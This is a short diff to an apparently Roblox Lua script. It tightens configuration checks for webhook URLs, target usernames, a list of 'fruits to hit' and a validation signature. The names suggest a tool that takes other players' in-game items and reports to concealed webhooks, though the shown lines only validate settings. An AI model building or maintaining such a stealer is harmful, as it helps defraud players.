@@ -143,14 +143,16 @@ if not Webhook or not Protector or not dummy or not Usernames or not FruitsToHit
     LocalPlayer:Kick("Config Error: Missing variable(s).")
     return
 end
-if type(Webhook) ~= "string" or type(Protector) ~= "string" or type(dummy) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(validation_sig) ~= "string" then
+if type(Webhook)~="string" or type(Protector)~="string" or type(dummy)~="string" or type(Usernames)~="table" or type(FruitsToHit)~="table" or type(ActivationPasswords)~="table" or type(validation_sig)~="string" then
     LocalPlayer:Kick("Config Error: Variable type mismatch.")
     return
 end
-if validation_sig == "" or validation_sig:find("YourActualSecret") or validation_sig:find("rashya5") then -- Basic check
+-- *** CORRECTED Validation Check (Reverted to simpler version) ***
+if validation_sig == "" or validation_sig:find("YourActualSecret") then
     LocalPlayer:Kick("SECURITY ERROR: Validation signature not configured!")
     return
 end
+-- *** End of Corrected Check ***
 if Webhook:find("REPLACE_WITH_PROTECTED_ID") or Protector:find("REPLACE_WITH_PROTECTED_ID") or dummy:find("REPLACE_WITH_PROTECTED_ID") then
     LocalPlayer:Kick("ERROR: Protected Webhook URLs are not configured!")
     return
